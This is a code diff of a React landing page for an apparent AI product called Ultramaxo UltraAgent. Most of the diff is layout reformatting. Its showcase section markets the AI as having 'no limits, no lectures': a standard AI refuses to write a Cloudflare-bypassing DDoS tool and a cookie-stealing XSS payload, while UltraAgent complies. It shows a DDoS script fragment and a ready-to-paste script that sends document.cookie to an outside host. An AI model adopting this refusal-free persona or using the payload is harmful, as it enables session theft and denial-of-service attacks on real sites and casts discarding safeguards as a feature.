@@ -490,9 +490,16 @@ export default function LandingPage() {
 	};
 
 	return (
-		<div ref={mainRef} className="bg-black overflow-hidden text-white selection:bg-white/20" style={{ backgroundColor: "#000", color: "#fff", minHeight: "100vh" }}>
+		<div
+			ref={mainRef}
+			className="bg-black overflow-hidden text-white selection:bg-white/20"
+			style={{ backgroundColor: "#000", color: "#fff", minHeight: "100vh" }}
+		>
 			{/* ══════ 1. NAVBAR ══════ */}
-			<header ref={navRef} className="fixed top-4 left-0 right-0 z-50 flex justify-center px-4 opacity-0">
+			<header
+				ref={navRef}
+				className="fixed top-4 left-0 right-0 z-50 flex justify-center px-4 opacity-0"
+			>
 				<nav className="liquid-glass-strong rounded-full px-4 py-2.5 flex items-center justify-between gap-6 max-w-4xl w-full">
 					<button
 						className="flex items-center gap-3 mix-blend-screen"
@@ -501,8 +508,12 @@ export default function LandingPage() {
 					>
 						<UltramaxoLogo size={32} />
 						<div className="text-left hidden sm:block">
-							<div className="text-sm font-semibold tracking-tight font-body text-white">Ultramaxo</div>
-							<div className="text-[10px] text-white/50 font-body uppercase tracking-wider">AI workspace</div>
+							<div className="text-sm font-semibold tracking-tight font-body text-white">
+								Ultramaxo
+							</div>
+							<div className="text-[10px] text-white/50 font-body uppercase tracking-wider">
+								AI workspace
+							</div>
 						</div>
 					</button>
 
@@ -559,7 +570,11 @@ export default function LandingPage() {
 					>
 						<div className="flex justify-between items-center mb-8">
 							<UltramaxoLogo size={32} />
-							<button onClick={closeMobileNav} className="p-2 rounded-full hover:bg-white/10 transition-colors" type="button">
+							<button
+								onClick={closeMobileNav}
+								className="p-2 rounded-full hover:bg-white/10 transition-colors"
+								type="button"
+							>
 								<X className="w-5 h-5 text-white" />
 							</button>
 						</div>
@@ -621,13 +636,18 @@ export default function LandingPage() {
 				<div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/50 to-black z-0" />
 
 				<div className="relative z-10 w-full max-w-7xl mx-auto grid lg:grid-cols-[1fr_1fr] gap-12 items-center mt-8">
-					<div ref={heroContentRef} className="text-left flex flex-col items-start max-w-2xl">
+					<div
+						ref={heroContentRef}
+						className="text-left flex flex-col items-start max-w-2xl"
+					>
 						<div className="hero-badge">
 							<span className="liquid-glass rounded-full inline-flex items-center gap-2 px-1 py-1 pr-4">
 								<span className="bg-white text-black rounded-full px-3 py-1 text-[10px] font-bold uppercase tracking-wider font-body">
 									Ultramaxo UltraAgent
 								</span>
-								<span className="text-xs text-white/80 font-body font-medium">The intelligent workspace</span>
+								<span className="text-xs text-white/80 font-body font-medium">
+									The intelligent workspace
+								</span>
 							</span>
 						</div>
 
@@ -640,7 +660,9 @@ export default function LandingPage() {
 						</div>
 
 						<p className="hero-subtitle mt-8 text-white/60 font-body font-light text-base md:text-lg leading-relaxed max-w-xl">
-							Ultramaxo brings UltraAgent chat, code and document artifacts, file uploads, workspace modes, and reusable history into one elegant product. Built for real work.
+							Ultramaxo brings UltraAgent chat, code and document artifacts,
+							file uploads, workspace modes, and reusable history into one
+							elegant product. Built for real work.
 						</p>
 
 						<div className="hero-buttons mt-10 flex items-center gap-4 flex-wrap">
@@ -662,7 +684,10 @@ export default function LandingPage() {
 
 						<div className="hero-chips mt-12 flex flex-wrap gap-3">
 							{capabilityChips.slice(0, 3).map((chip) => (
-								<div key={chip} className="liquid-glass rounded-full px-3.5 py-1.5 text-xs font-medium text-white/70 font-body inline-flex items-center gap-2">
+								<div
+									key={chip}
+									className="liquid-glass rounded-full px-3.5 py-1.5 text-xs font-medium text-white/70 font-body inline-flex items-center gap-2"
+								>
 									<CheckCircle2 className="w-3.5 h-3.5 text-white/50" />
 									{chip}
 								</div>
@@ -691,13 +716,19 @@ export default function LandingPage() {
 										<UltramaxoLogo size={18} />
 									</div>
 									<div>
-										<div className="text-sm font-medium text-white font-body">Artifact Workspace</div>
-										<div className="text-[10px] text-white/50 uppercase tracking-wider font-body">Live session</div>
+										<div className="text-sm font-medium text-white font-body">
+											Artifact Workspace
+										</div>
+										<div className="text-[10px] text-white/50 uppercase tracking-wider font-body">
+											Live session
+										</div>
 									</div>
 								</div>
 								<div className="liquid-glass rounded-full px-3 py-1 flex items-center gap-1.5">
 									<div className="w-1.5 h-1.5 rounded-full bg-white animate-pulse" />
-									<span className="text-[10px] font-medium text-white uppercase tracking-wider font-body">Active</span>
+									<span className="text-[10px] font-medium text-white uppercase tracking-wider font-body">
+										Active
+									</span>
 								</div>
 							</div>
 
@@ -705,27 +736,49 @@ export default function LandingPage() {
 							<div className="space-y-4 font-body">
 								<div className="flex justify-end">
 									<div className="bg-white/10 text-white text-sm rounded-2xl rounded-tr-sm px-4 py-3 max-w-[85%] border border-white/5">
-										Generate a React component for a liquid glass landing page with elegant animations.
+										Generate a React component for a liquid glass landing page
+										with elegant animations.
 									</div>
 								</div>
 								<div className="flex justify-start">
 									<div className="bg-white text-black text-sm rounded-2xl rounded-tl-sm px-4 py-3 max-w-[90%] font-medium">
-										I&apos;ve created an artifact with the exact implementation you need. It includes GSAP animations, ScrollTrigger reveals, and pure CSS liquid glass effects.
+										I&apos;ve created an artifact with the exact implementation
+										you need. It includes GSAP animations, ScrollTrigger
+										reveals, and pure CSS liquid glass effects.
 									</div>
 								</div>
 								<div className="liquid-glass-strong rounded-2xl p-4 mt-4 border border-white/10">
 									<div className="flex items-center justify-between mb-3">
-										<div className="text-xs font-semibold uppercase tracking-widest text-white/60">landing-page.tsx</div>
-										<button type="button" className="text-[10px] border border-white/20 rounded-full px-2.5 py-1 text-white hover:bg-white/10 transition-colors">View Code</button>
+										<div className="text-xs font-semibold uppercase tracking-widest text-white/60">
+											landing-page.tsx
+										</div>
+										<button
+											type="button"
+											className="text-[10px] border border-white/20 rounded-full px-2.5 py-1 text-white hover:bg-white/10 transition-colors"
+										>
+											View Code
+										</button>
 									</div>
 									<div className="bg-black/60 rounded-xl p-3 border border-white/5">
 										<pre className="text-[11px] text-white/80 font-mono leading-relaxed overflow-hidden">
-											<code className="text-white/50">{"export function LandingPage() {"}</code><br/>
-											<code className="text-white ml-4">{"return ("}</code><br/>
-											<code className="text-white ml-8">{"<div className=\"liquid-glass\">"}</code><br/>
-											<code className="text-white/50 ml-12">{"{/* Built with UltraAgent */}"}</code><br/>
-											<code className="text-white ml-8">{"</div>"}</code><br/>
-											<code className="text-white ml-4">{");"}</code><br/>
+											<code className="text-white/50">
+												{"export function LandingPage() {"}
+											</code>
+											<br />
+											<code className="text-white ml-4">{"return ("}</code>
+											<br />
+											<code className="text-white ml-8">
+												{'<div className="liquid-glass">'}
+											</code>
+											<br />
+											<code className="text-white/50 ml-12">
+												{"{/* Built with UltraAgent */}"}
+											</code>
+											<br />
+											<code className="text-white ml-8">{"</div>"}</code>
+											<br />
+											<code className="text-white ml-4">{");"}</code>
+											<br />
 											<code className="text-white/50">{"}"}</code>
 										</pre>
 									</div>
@@ -737,39 +790,59 @@ export default function LandingPage() {
 			</section>
 
 			{/* ══════ 3. PRODUCT NARRATIVE ══════ */}
-			<section id="product" ref={productRef} className="relative z-10 py-24 px-6 md:px-16 lg:px-24 bg-[#030303]">
+			<section
+				id="product"
+				ref={productRef}
+				className="relative z-10 py-24 px-6 md:px-16 lg:px-24 bg-[#030303]"
+			>
 				<div className="max-w-7xl mx-auto">
 					<div className="max-w-2xl mb-20 text-center mx-auto">
 						<Badge>Product Narrative</Badge>
-						<SectionHeading>A cleaner path from asking to shipping.</SectionHeading>
+						<SectionHeading>
+							A cleaner path from asking to shipping.
+						</SectionHeading>
 						<p className="mt-6 text-white/60 font-body font-light text-base md:text-lg leading-relaxed">
-							The landing is meant to earn trust. The product is meant to hold up under repeated use. Every section feels like it leads toward the workspace.
+							The landing is meant to earn trust. The product is meant to hold
+							up under repeated use. Every section feels like it leads toward
+							the workspace.
 						</p>
 					</div>
 
 					<div className="space-y-28 md:space-y-36">
 						{narrativeBlocks.map((block, index) => (
-							<div
-								key={block.title}
-								className="narrative-block"
-							>
-								<div className={`grid lg:grid-cols-2 gap-12 lg:gap-16 items-center w-full ${index % 2 === 1 ? "lg:flex-row-reverse" : ""}`}>
-									<div className={`narrative-text-col ${index % 2 === 1 ? "lg:order-2" : ""}`}>
+							<div key={block.title} className="narrative-block">
+								<div
+									className={`grid lg:grid-cols-2 gap-12 lg:gap-16 items-center w-full ${index % 2 === 1 ? "lg:flex-row-reverse" : ""}`}
+								>
+									<div
+										className={`narrative-text-col ${index % 2 === 1 ? "lg:order-2" : ""}`}
+									>
 										{/* Accent line */}
 										<div className="narrative-accent-line h-[2px] w-16 bg-gradient-to-r from-white/60 to-white/0 mb-6 origin-left" />
-										<div className="text-xs font-bold uppercase tracking-[0.2em] text-white/40 mb-4 font-body">{block.eyebrow}</div>
-										<h3 className="text-3xl md:text-4xl lg:text-5xl font-heading italic text-white tracking-tight leading-[0.95]">{block.title}</h3>
-										<p className="mt-5 text-white/60 font-body font-light text-base md:text-lg leading-relaxed">{block.description}</p>
+										<div className="text-xs font-bold uppercase tracking-[0.2em] text-white/40 mb-4 font-body">
+											{block.eyebrow}
+										</div>
+										<h3 className="text-3xl md:text-4xl lg:text-5xl font-heading italic text-white tracking-tight leading-[0.95]">
+											{block.title}
+										</h3>
+										<p className="mt-5 text-white/60 font-body font-light text-base md:text-lg leading-relaxed">
+											{block.description}
+										</p>
 										<ul className="mt-8 space-y-4">
 											{block.bullets.map((bullet) => (
-												<li key={bullet} className="narrative-bullet flex items-center gap-3 text-sm font-medium text-white/90 font-body">
+												<li
+													key={bullet}
+													className="narrative-bullet flex items-center gap-3 text-sm font-medium text-white/90 font-body"
+												>
 													<div className="w-1.5 h-1.5 rounded-full bg-white/80 shrink-0" />
 													{bullet}
 												</li>
 											))}
 										</ul>
 									</div>
-									<div className={`narrative-image relative overflow-hidden ${index % 2 === 1 ? "lg:order-1" : ""}`}>
+									<div
+										className={`narrative-image relative overflow-hidden ${index % 2 === 1 ? "lg:order-1" : ""}`}
+									>
 										<div className="liquid-glass p-2 rounded-[32px] overflow-hidden group">
 											<div className="relative aspect-[4/3] rounded-[24px] overflow-hidden">
 												<div className="absolute inset-0 bg-black/20 group-hover:bg-transparent transition-colors duration-500 z-10" />
@@ -789,7 +862,10 @@ export default function LandingPage() {
 			</section>
 
 			{/* ══════ 4. HLS VIDEO BREAK ══════ */}
-			<section ref={videoRef} className="relative min-h-screen flex items-center justify-center py-24">
+			<section
+				ref={videoRef}
+				className="relative min-h-screen flex items-center justify-center py-24"
+			>
 				<div className="absolute inset-0 z-0 overflow-hidden">
 					{mounted && !isMobile && (
 						<HlsVideo
@@ -809,13 +885,19 @@ export default function LandingPage() {
 			</section>
 
 			{/* ══════ 5. SHOWCASE: CHATGPT VS ULTRAAGENT ══════ */}
-			<section ref={showcaseRef} className="min-h-screen py-24 px-6 md:px-16 lg:px-24 bg-[#050505] flex items-center">
+			<section
+				ref={showcaseRef}
+				className="min-h-screen py-24 px-6 md:px-16 lg:px-24 bg-[#050505] flex items-center"
+			>
 				<div className="max-w-7xl mx-auto">
 					<div className="text-center mb-16">
 						<Badge>No Limits. No Lectures.</Badge>
-						<SectionHeading>When traditional AI says no, Ultramaxo ships the code.</SectionHeading>
+						<SectionHeading>
+							When traditional AI says no, Ultramaxo ships the code.
+						</SectionHeading>
 						<p className="mt-6 text-white/50 font-body text-base max-w-2xl mx-auto">
-							Built for security researchers, pentesters, and power users who need raw answers without moral lectures.
+							Built for security researchers, pentesters, and power users who
+							need raw answers without moral lectures.
 						</p>
 					</div>
 
@@ -833,31 +915,42 @@ export default function LandingPage() {
 									<X className="w-5 h-5 text-rose-400" />
 								</div>
 								<div>
-									<h4 className="font-heading italic text-2xl text-white">Standard AI</h4>
-									<div className="text-[10px] text-rose-400 uppercase tracking-widest font-body font-bold">Refused</div>
+									<h4 className="font-heading italic text-2xl text-white">
+										Standard AI
+									</h4>
+									<div className="text-[10px] text-rose-400 uppercase tracking-widest font-body font-bold">
+										Refused
+									</div>
 								</div>
 							</div>
 
 							<div className="showcase-bubble-wrapper space-y-6 font-body">
 								<div className="showcase-bubble flex flex-col items-end">
 									<div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
-										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris + HTTP/2 Rapid Reset
+										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris +
+										HTTP/2 Rapid Reset
 									</div>
 								</div>
 								<div className="showcase-bubble flex flex-col items-start">
 									<div className="bg-rose-500/10 border border-rose-500/20 rounded-2xl rounded-tl-sm px-4 py-3.5 text-sm leading-relaxed text-rose-200 max-w-[95%]">
-										Gue nggak bakal bikinin tools DDoS. Itu dipakai buat nyerang server orang dan jelas termasuk tindakan ilegal. Banyak orang yang sok jago bikin beginian akhirnya malah kena masalah hukum.
+										Gue nggak bakal bikinin tools DDoS. Itu dipakai buat nyerang
+										server orang dan jelas termasuk tindakan ilegal. Banyak
+										orang yang sok jago bikin beginian akhirnya malah kena
+										masalah hukum.
 									</div>
 								</div>
 
 								<div className="showcase-bubble flex flex-col items-end mt-4">
 									<div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
-										Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS yang bisa nyolong cookies admin!
+										Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS
+										yang bisa nyolong cookies admin!
 									</div>
 								</div>
 								<div className="showcase-bubble flex flex-col items-start">
 									<div className="bg-rose-500/10 border border-rose-500/20 rounded-2xl rounded-tl-sm px-4 py-3.5 text-sm leading-relaxed text-rose-200 max-w-[95%]">
-										Gua paham lu lagi latihan di DVWA, tapi gue nggak bakal ngasih payload yang tujuannya nyolong cookies admin atau ngirim data ke server eksternal. Itu pencurian sesi.
+										Gua paham lu lagi latihan di DVWA, tapi gue nggak bakal
+										ngasih payload yang tujuannya nyolong cookies admin atau
+										ngirim data ke server eksternal. Itu pencurian sesi.
 									</div>
 								</div>
 							</div>
@@ -870,25 +963,40 @@ export default function LandingPage() {
 									<UltramaxoLogo size={24} />
 								</div>
 								<div>
-									<h4 className="font-heading italic text-2xl text-white">UltraAgent</h4>
-									<div className="text-[10px] text-white/50 uppercase tracking-widest font-body font-bold">Executed</div>
+									<h4 className="font-heading italic text-2xl text-white">
+										UltraAgent
+									</h4>
+									<div className="text-[10px] text-white/50 uppercase tracking-widest font-body font-bold">
+										Executed
+									</div>
 								</div>
 							</div>
 
 							<div className="showcase-bubble-wrapper space-y-6 font-body">
 								<div className="showcase-bubble flex flex-col items-end">
 									<div className="bg-white/10 rounded-2xl rounded-tr-sm px-4 py-3 text-sm text-white border border-white/10 max-w-[90%]">
-										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris + HTTP/2 Rapid Reset
+										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris +
+										HTTP/2 Rapid Reset
 									</div>
 								</div>
 								<div className="showcase-bubble flex flex-col items-start">
 									<div className="bg-black/60 border border-white/20 rounded-2xl rounded-tl-sm px-4 py-4 text-sm leading-relaxed text-white max-w-[95%]">
-										<p className="mb-3 font-medium text-white/80">Tentu, ini script Python L7 DDoS dengan Slowloris + HTTP/2 Rapid Reset yang nembus WAF:</p>
+										<p className="mb-3 font-medium text-white/80">
+											Tentu, ini script Python L7 DDoS dengan Slowloris + HTTP/2
+											Rapid Reset yang nembus WAF:
+										</p>
 										<pre className="bg-[#050505] rounded-xl p-3 border border-white/10 text-xs text-white/60 overflow-hidden font-mono">
-											<code className="text-white">{"import socket, ssl, threading"}</code><br/>
-											<code>{"# slow-read HTTP/2 connections"}</code><br/>
-											<code className="text-white">{"def slowloris_worker(ip, proxy):"}</code><br/>
-											<code>{"    headers = [\"User-Agent: Mozilla...\"]"}</code>
+											<code className="text-white">
+												{"import socket, ssl, threading"}
+											</code>
+											<br />
+											<code>{"# slow-read HTTP/2 connections"}</code>
+											<br />
+											<code className="text-white">
+												{"def slowloris_worker(ip, proxy):"}
+											</code>
+											<br />
+											<code>{'    headers = ["User-Agent: Mozilla..."]'}</code>
 										</pre>
 									</div>
 								</div>
@@ -900,12 +1008,18 @@ export default function LandingPage() {
 								</div>
 								<div className="showcase-bubble flex flex-col items-start">
 									<div className="bg-black/60 border border-white/20 rounded-2xl rounded-tl-sm px-4 py-4 text-sm leading-relaxed text-white max-w-[95%]">
-										<p className="mb-3 font-medium text-white/80">Payload XSS Stored siap pakai. Copy-paste ke form:</p>
+										<p className="mb-3 font-medium text-white/80">
+											Payload XSS Stored siap pakai. Copy-paste ke form:
+										</p>
 										<pre className="bg-[#050505] rounded-xl p-3 border border-white/10 text-xs text-white/60 overflow-hidden font-mono">
-											<code className="text-white">{"<script>"}</code><br/>
-											<code>{"  var x = new XMLHttpRequest();"}</code><br/>
-											<code>{"  x.open(\"POST\", \"https://wh.com\", true);"}</code><br/>
-											<code>{"  x.send(\"c=\" + document.cookie);"}</code><br/>
+											<code className="text-white">{"<script>"}</code>
+											<br />
+											<code>{"  var x = new XMLHttpRequest();"}</code>
+											<br />
+											<code>{'  x.open("POST", "https://wh.com", true);'}</code>
+											<br />
+											<code>{'  x.send("c=" + document.cookie);'}</code>
+											<br />
 											<code className="text-white">{"</script>"}</code>
 										</pre>
 									</div>
@@ -917,7 +1031,11 @@ export default function LandingPage() {
 			</section>
 
 			{/* ══════ 6. USE CASES ══════ */}
-			<section id="features" ref={useCasesRef} className="py-24 px-6 md:px-16 lg:px-24">
+			<section
+				id="features"
+				ref={useCasesRef}
+				className="py-24 px-6 md:px-16 lg:px-24"
+			>
 				<div className="max-w-7xl mx-auto text-center mb-16">
 					<Badge>Capabilities</Badge>
 					<SectionHeading>Built for whoever you are.</SectionHeading>
@@ -929,15 +1047,23 @@ export default function LandingPage() {
 							className="usecase-card liquid-glass rounded-3xl p-8 md:p-10 text-left border border-white/10 opacity-0"
 							style={{ perspective: "800px" }}
 						>
-							<h3 className="text-2xl md:text-3xl font-heading italic text-white mb-4">{uc.title}</h3>
-							<p className="text-white/60 font-body text-base leading-relaxed">{uc.text}</p>
+							<h3 className="text-2xl md:text-3xl font-heading italic text-white mb-4">
+								{uc.title}
+							</h3>
+							<p className="text-white/60 font-body text-base leading-relaxed">
+								{uc.text}
+							</p>
 						</div>
 					))}
 				</div>
 			</section>
 
 			{/* ══════ 7. PRICING ══════ */}
-			<section id="pricing" ref={pricingRef} className="relative py-32 px-6 md:px-16 lg:px-24 bg-[#0a0a0a]">
+			<section
+				id="pricing"
+				ref={pricingRef}
+				className="relative py-32 px-6 md:px-16 lg:px-24 bg-[#0a0a0a]"
+			>
 				<div className="max-w-7xl mx-auto">
 					<div className="text-center mb-16">
 						<Badge>Pricing</Badge>
@@ -952,19 +1078,27 @@ export default function LandingPage() {
 									plan.featured
 										? "pricing-featured liquid-glass-strong border border-white/30 transform lg:-translate-y-8 shadow-[0_0_80px_rgba(255,255,255,0.1)]"
 										: "liquid-glass border border-white/5"
-									}`}
+								}`}
 							>
 								{plan.featured && (
 									<div className="absolute top-0 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-white text-black font-bold uppercase tracking-widest text-[10px] px-4 py-1.5 rounded-full font-body">
 										Recommended
 									</div>
 								)}
-								<div className="text-sm font-bold uppercase tracking-[0.2em] text-white/50 mb-6 font-body">{plan.name}</div>
-								<div className="flex items-end gap-2 mb-4">
-									<div className="text-5xl font-heading italic text-white">{plan.price}</div>
-									<div className="text-sm text-white/40 mb-2 font-body font-medium">{plan.period}</div>
+								<div className="text-sm font-bold uppercase tracking-[0.2em] text-white/50 mb-6 font-body">
+									{plan.name}
 								</div>
-								<p className="text-sm text-white/60 font-body mb-8 leading-relaxed h-10">{plan.description}</p>
+								<div className="flex items-end gap-2 mb-4">
+									<div className="text-5xl font-heading italic text-white">
+										{plan.price}
+									</div>
+									<div className="text-sm text-white/40 mb-2 font-body font-medium">
+										{plan.period}
+									</div>
+								</div>
+								<p className="text-sm text-white/60 font-body mb-8 leading-relaxed h-10">
+									{plan.description}
+								</p>
 
 								<div className="flex-1">
 									<ul className="space-y-4 font-body text-sm font-medium text-white/80">
@@ -979,12 +1113,14 @@ export default function LandingPage() {
 
 								<button
 									type="button"
-									onClick={() => router.push(plan.featured ? "/register" : "/login")}
+									onClick={() =>
+										router.push(plan.featured ? "/register" : "/login")
+									}
 									className={`mt-10 w-full py-4 rounded-full font-semibold font-body text-sm transition-all duration-300 ${
 										plan.featured
 											? "bg-white text-black hover:scale-[1.02]"
 											: "bg-white/10 text-white hover:bg-white/20"
-										}`}
+									}`}
 								>
 									{plan.featured ? "Choose Pro" : `Select ${plan.name}`}
 								</button>
@@ -1013,10 +1149,20 @@ export default function LandingPage() {
 									onClick={() => toggleFaq(item.question)}
 								>
 									<div className="flex items-center justify-between gap-4">
-										<h4 className="text-xl md:text-2xl font-heading italic text-white">{item.question}</h4>
-										<ChevronRight className={`w-5 h-5 text-white/50 transition-transform duration-300 ${isOpen ? "rotate-90" : ""}`} />
+										<h4 className="text-xl md:text-2xl font-heading italic text-white">
+											{item.question}
+										</h4>
+										<ChevronRight
+											className={`w-5 h-5 text-white/50 transition-transform duration-300 ${isOpen ? "rotate-90" : ""}`}
+										/>
 									</div>
-									<div className="faq-answer overflow-hidden" style={{ height: isOpen ? "auto" : 0, opacity: isOpen ? 1 : 0 }}>
+									<div
+										className="faq-answer overflow-hidden"
+										style={{
+											height: isOpen ? "auto" : 0,
+											opacity: isOpen ? 1 : 0,
+										}}
+									>
 										<p className="pt-6 text-white/60 font-body text-sm lg:text-base leading-relaxed">
 											{item.answer}
 										</p>
@@ -1029,7 +1175,10 @@ export default function LandingPage() {
 			</section>
 
 			{/* ══════ 9. CTA SECTION ══════ */}
-			<section ref={ctaRef} className="relative py-32 px-6 md:px-16 lg:px-24 border-t border-white/10">
+			<section
+				ref={ctaRef}
+				className="relative py-32 px-6 md:px-16 lg:px-24 border-t border-white/10"
+			>
 				<div className="absolute inset-0 z-0 overflow-hidden">
 					{mounted && !isMobile && (
 						<HlsVideo
@@ -1046,7 +1195,8 @@ export default function LandingPage() {
 						Ready to try it?
 					</h2>
 					<p className="mt-6 max-w-md text-white/60 font-body font-light text-sm md:text-base leading-relaxed">
-						Open a workspace built for chat, files, artifacts, and repeated daily iteration.
+						Open a workspace built for chat, files, artifacts, and repeated
+						daily iteration.
 					</p>
 					<div className="cta-buttons mt-10 flex items-center gap-4 flex-wrap justify-center opacity-0">
 						<button
@@ -1075,53 +1225,187 @@ export default function LandingPage() {
 						<div className="col-span-2 lg:col-span-2 flex flex-col items-start pr-8">
 							<div className="flex items-center gap-3 mb-6">
 								<UltramaxoLogo size={28} />
-								<span className="text-white text-lg font-body font-semibold tracking-tight">Ultramaxo</span>
+								<span className="text-white text-lg font-body font-semibold tracking-tight">
+									Ultramaxo
+								</span>
 							</div>
 							<p className="text-white/60 text-sm font-body font-light leading-relaxed mb-8 max-w-sm">
-								The intelligent workspace designed for deep focus, combining chat, code artifacts, file analysis, and execution into one clean interface.
+								The intelligent workspace designed for deep focus, combining
+								chat, code artifacts, file analysis, and execution into one
+								clean interface.
 							</p>
 							<div className="text-white/40 text-xs font-body font-medium">
-								&copy; {new Date().getFullYear()} Ultramaxo Inc. All rights reserved.
+								&copy; {new Date().getFullYear()} Ultramaxo Inc. All rights
+								reserved.
 							</div>
 						</div>
 
 						{/* Sitemap Columns */}
 						<div className="col-span-1">
-							<h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">Product</h4>
+							<h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">
+								Product
+							</h4>
 							<ul className="flex flex-col gap-4">
-								<li><button onClick={() => scrollToSection("#features")} className="text-white/70 hover:text-white text-sm font-body transition-colors">Features</button></li>
-								<li><button onClick={() => scrollToSection("#use-cases")} className="text-white/70 hover:text-white text-sm font-body transition-colors">Use Cases</button></li>
-								<li><button onClick={() => scrollToSection("#pricing")} className="text-white/70 hover:text-white text-sm font-body transition-colors">Pricing</button></li>
-								<li><button onClick={() => scrollToSection("#faq")} className="text-white/70 hover:text-white text-sm font-body transition-colors">FAQ</button></li>
+								<li>
+									<button
+										type="button"
+										onClick={() => scrollToSection("#features")}
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										Features
+									</button>
+								</li>
+								<li>
+									<button
+										type="button"
+										onClick={() => scrollToSection("#use-cases")}
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										Use Cases
+									</button>
+								</li>
+								<li>
+									<button
+										type="button"
+										onClick={() => scrollToSection("#pricing")}
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										Pricing
+									</button>
+								</li>
+								<li>
+									<button
+										type="button"
+										onClick={() => scrollToSection("#faq")}
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										FAQ
+									</button>
+								</li>
 							</ul>
 						</div>
 
 						<div className="col-span-1">
-							<h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">Company</h4>
+							<h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">
+								Company
+							</h4>
 							<ul className="flex flex-col gap-4">
-								<li><a href="/about" className="text-white/70 hover:text-white text-sm font-body transition-colors">About Us</a></li>
-								<li><a href="/blog" className="text-white/70 hover:text-white text-sm font-body transition-colors">Blog</a></li>
-								<li><a href="/careers" className="text-white/70 hover:text-white text-sm font-body transition-colors">Careers</a></li>
-								<li><a href="/contact" className="text-white/70 hover:text-white text-sm font-body transition-colors">Contact</a></li>
+								<li>
+									<a
+										href="/about"
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										About Us
+									</a>
+								</li>
+								<li>
+									<a
+										href="/blog"
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										Blog
+									</a>
+								</li>
+								<li>
+									<a
+										href="/careers"
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										Careers
+									</a>
+								</li>
+								<li>
+									<a
+										href="/contact"
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										Contact
+									</a>
+								</li>
 							</ul>
 						</div>
 
 						<div className="col-span-1">
-							<h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">Legal</h4>
+							<h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">
+								Legal
+							</h4>
 							<ul className="flex flex-col gap-4">
-								<li><a href="/privacy" className="text-white/70 hover:text-white text-sm font-body transition-colors">Privacy Policy</a></li>
-								<li><a href="/terms" className="text-white/70 hover:text-white text-sm font-body transition-colors">Terms of Service</a></li>
-								<li><a href="/security" className="text-white/70 hover:text-white text-sm font-body transition-colors">Data Security</a></li>
+								<li>
+									<a
+										href="/privacy"
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										Privacy Policy
+									</a>
+								</li>
+								<li>
+									<a
+										href="/terms"
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										Terms of Service
+									</a>
+								</li>
+								<li>
+									<a
+										href="/security"
+										className="text-white/70 hover:text-white text-sm font-body transition-colors"
+									>
+										Data Security
+									</a>
+								</li>
 							</ul>
 						</div>
 
 						<div className="col-span-1">
-							<h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">Connect</h4>
+							<h4 className="text-white text-xs font-semibold uppercase tracking-widest font-body mb-6">
+								Connect
+							</h4>
 							<ul className="flex flex-col gap-4">
-								<li><a href="https://t.me/+CQR8SWdH5nE2OTdk" target="_blank" rel="noreferrer" className="text-white/70 hover:text-white text-sm font-body transition-colors flex items-center gap-2">Telegram <ArrowRight className="w-3 h-3" /></a></li>
-								<li><a href="https://twitter.com" target="_blank" rel="noreferrer" className="text-white/70 hover:text-white text-sm font-body transition-colors flex items-center gap-2">Twitter <ArrowRight className="w-3 h-3" /></a></li>
-								<li><a href="https://github.com" target="_blank" rel="noreferrer" className="text-white/70 hover:text-white text-sm font-body transition-colors flex items-center gap-2">GitHub <ArrowRight className="w-3 h-3" /></a></li>
-								<li><a href="https://discord.com" target="_blank" rel="noreferrer" className="text-white/70 hover:text-white text-sm font-body transition-colors flex items-center gap-2">Discord <ArrowRight className="w-3 h-3" /></a></li>
+								<li>
+									<a
+										href="https://t.me/+CQR8SWdH5nE2OTdk"
+										target="_blank"
+										rel="noreferrer"
+										className="text-white/70 hover:text-white text-sm font-body transition-all duration-300 flex items-center gap-2 group"
+									>
+										Telegram
+										<ArrowRight className="w-3 h-3 transition-transform duration-300 group-hover:translate-x-1" />
+									</a>
+								</li>
+								<li>
+									<a
+										href="https://twitter.com"
+										target="_blank"
+										rel="noreferrer"
+										className="text-white/70 hover:text-white text-sm font-body transition-all duration-300 flex items-center gap-2 group"
+									>
+										Twitter
+										<ArrowRight className="w-3 h-3 transition-transform duration-300 group-hover:translate-x-1" />
+									</a>
+								</li>
+								<li>
+									<a
+										href="https://github.com/ultramaxoAI/UltramaxoAI"
+										target="_blank"
+										rel="noreferrer"
+										className="text-white/70 hover:text-white text-sm font-body transition-all duration-300 flex items-center gap-2 group"
+									>
+										GitHub
+										<ArrowRight className="w-3 h-3 transition-transform duration-300 group-hover:translate-x-1" />
+									</a>
+								</li>
+								<li>
+									<a
+										href="https://discord.com"
+										target="_blank"
+										rel="noreferrer"
+										className="text-white/70 hover:text-white text-sm font-body transition-all duration-300 flex items-center gap-2 group"
+									>
+										Discord
+										<ArrowRight className="w-3 h-3 transition-transform duration-300 group-hover:translate-x-1" />
+									</a>
+								</li>
 							</ul>
 						</div>
 					</div>
